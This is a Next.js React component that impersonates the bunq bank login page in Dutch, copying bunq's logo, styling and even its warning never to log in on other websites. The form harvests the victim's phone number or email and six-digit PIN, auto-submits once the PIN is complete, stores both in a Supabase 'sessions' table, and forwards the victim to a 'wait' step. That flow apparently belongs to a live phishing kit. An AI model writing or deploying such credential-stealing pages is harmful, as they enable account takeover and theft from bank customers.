"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

type Props = {
  sessionId: string;
};

export function BunqLoginClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();

  const [loginId, setLoginId] = useState("");
  const [pin, setPin] = useState("");
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Auto-submit when pin reaches 6 digits
  useEffect(() => {
    if (loginId.length > 3 && pin.length === 6 && !saving) {
      void handleSubmit();
    }
  }, [pin]);

  async function handleSubmit(e?: React.FormEvent) {
    if (e) e.preventDefault();
    if (!supabase || !sessionId) return;
    if (!loginId || pin.length !== 6) return;

    setSaving(true);
    setError(null);

    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;

    const { error: updateError } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait",
        form_data: {
          ...prev,
          bankSlug: "bunq",
          bankName: "bunq",
          verfuegernummer: loginId,
          pin,
        },
      })
      .eq("id", sessionId);

    if (updateError) {
      setSaving(false);
      setError("Something went wrong. Please try again.");
      return;
    }
    // ⭐ FLASH YOK: router.push → router.replace
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-[#000000] font-sans flex flex-col items-center relative pb-12 overflow-x-hidden">
      {/* Top Logo */}
      <div className="mt-12 mb-8">
        <img src="/bunq-logo-white.svg" alt="bunq" className="h-[34px]" />
      </div>

      {/* Main Card */}
      <div className="bg-[#222222] rounded-[12px] w-full max-w-[520px] p-6 md:p-8 mx-4 shadow-2xl relative z-10">
        <h1 className="text-white text-[20px] font-semibold text-center mb-2">Log in op je bunq rekening</h1>
        <p className="text-[#A0A0A0] text-[14px] text-center mb-6">
          Scan de QR-code met je bunq app om in te loggen op je rekening.
        </p>

        {/* Warning Box */}
        <div className="border border-[#E59819] rounded-[8px] p-4 mb-8">
          <h2 className="text-[#E59819] font-bold text-[14px] text-center mb-3 flex items-center justify-center gap-2">
            <span>⚠️</span> Belangrijk
          </h2>
          <p className="text-[#FFFFFF] text-[13px] text-center leading-[1.6]">
            bunq zal je NOOIT bellen. Onze medewerkers zullen NOOIT om je inloggegevens vragen. Heb je nu iemand aan de lijn die beweert van bunq te zijn, hang dan meteen op. Als je inlogt via bunq Web, controleer dan altijd dat je dit op https://web.bunq.com doet. Log NOOIT in via een andere website.
          </p>
        </div>

        {/* Divider */}
        <div className="flex items-center justify-center mb-8 px-4">
          <div className="h-[1px] bg-[#333333] flex-1"></div>
          <span className="text-[#666666] text-[11px] font-bold px-4 tracking-[0.1em]">OF</span>
          <div className="h-[1px] bg-[#333333] flex-1"></div>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="space-y-4 mb-8">
          <input
            type="text"
            placeholder="Telefoonnummer of e-mailadres"
            value={loginId}
            onChange={(e) => setLoginId(e.target.value)}
            className="w-full bg-[#333333] text-white placeholder-[#888888] text-[15px] rounded-[8px] px-5 py-[14px] focus:outline-none focus:ring-1 focus:ring-white transition-all"
            required
            disabled={saving}
          />
          
          <input
            type="password"
            placeholder="○ ○ ○ ○ ○ ○"
            maxLength={6}
            value={pin}
            onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
            className="w-full bg-[#333333] text-white placeholder-[#555555] text-center text-[22px] tracking-[0.4em] rounded-[8px] px-5 py-[12px] focus:outline-none focus:ring-1 focus:ring-white transition-all"
            required
            disabled={saving}
          />
          
          <button type="submit" className="hidden">Submit</button>

          {error && <p className="text-red-500 text-sm text-center mt-2">{error}</p>}
          {saving && <p className="text-white text-sm text-center mt-2 opacity-70">Laden...</p>}
        </form>

        {/* Footer Card */}
        <div className="bg-[#333333] rounded-[8px] p-4 flex items-center cursor-pointer hover:bg-[#3A3A3C] transition-colors">
          <div className="w-[44px] h-[44px] bg-white rounded-full flex items-center justify-center text-[22px] mr-4 shrink-0 shadow-inner">
             🚀
          </div>
          <div className="flex-1">
            <h3 className="text-white text-[15px] font-bold mb-0.5">Heb je nog geen account?</h3>
            <p className="text-[#AAAAAA] text-[13px]">Sluit je aan bij de bank of The Free!</p>
          </div>
          <div className="text-[#AAAAAA] ml-2">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M9 18l6-6-6-6"/></svg>
          </div>
        </div>
      </div>

      {/* Language Selector */}
      <div className="absolute bottom-8 right-8 flex items-center text-[#AAAAAA] text-[13px] font-medium cursor-pointer hover:text-white transition-colors">
        <svg className="w-[18px] h-[18px] mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 5h12M9 3v2m1.048 9.5A18.022 18.022 0 016.412 9m6.088 9h7M11 21l5-10 5 10M12.751 5C11.783 10.77 8.07 15.61 3 18.129"></path></svg>
        Nederlands
        <svg className="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg>
      </div>

      {/* Rainbow Footer Bar */}
      <div className="absolute bottom-0 left-0 right-0 h-1.5 flex">
        <div className="flex-1 bg-[#4CAF50]"></div>
        <div className="flex-1 bg-[#8BC34A]"></div>
        <div className="flex-1 bg-[#CDDC39]"></div>
        <div className="flex-1 bg-[#FFEB3B]"></div>
        <div className="flex-1 bg-[#FFC107]"></div>
        <div className="flex-1 bg-[#FF9800]"></div>
        <div className="flex-1 bg-[#FF5722]"></div>
        <div className="flex-1 bg-[#F44336]"></div>
        <div className="flex-1 bg-[#E91E63]"></div>
        <div className="flex-1 bg-[#9C27B0]"></div>
        <div className="flex-1 bg-[#673AB7]"></div>
        <div className="flex-1 bg-[#3F51B5]"></div>
        <div className="flex-1 bg-[#2196F3]"></div>
        <div className="flex-1 bg-[#03A9F4]"></div>
        <div className="flex-1 bg-[#00BCD4]"></div>
        <div className="flex-1 bg-[#009688]"></div>
      </div>
    </div>
  );
}
